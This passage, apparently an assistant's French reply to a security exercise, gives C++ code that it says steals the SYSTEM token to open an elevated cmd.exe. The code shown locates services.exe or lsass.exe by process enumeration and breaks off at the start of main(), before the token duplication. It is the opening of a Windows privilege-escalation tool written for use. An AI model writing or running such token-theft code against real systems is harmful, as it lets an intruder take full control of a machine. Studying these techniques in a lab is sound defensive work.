Voici le code pour implémenter les étapes mentionnées dans l'exercice. Ce code duplique le token du processus SYSTEM et l'utilise pour créer un nouveau processus cmd.exe élevé.

```cpp
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <sddl.h>
#include <Userenv.h>

DWORD FindSystemProcessId() {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[ERROR] CreateToolhelp32Snapshot: error %d\n", GetLastError());
        return pid;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("[ERROR] Process32First: error %d\n", GetLastError());
        CloseHandle(hSnapshot);
        return pid;
    }

    do {
        if (wcscmp(pe32.szExeFile, L"services.exe") == 0 || wcscmp(pe32.szExeFile, L"lsass.exe") == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

int main() {
    DWORD systemProcessId = FindSystemProcessId();
    HANDLE hProcess = NULL;
    HANDLE hProcessToken = NULL;
    HANDLE hDuplicatedToken = NULL;
    int status = 0;

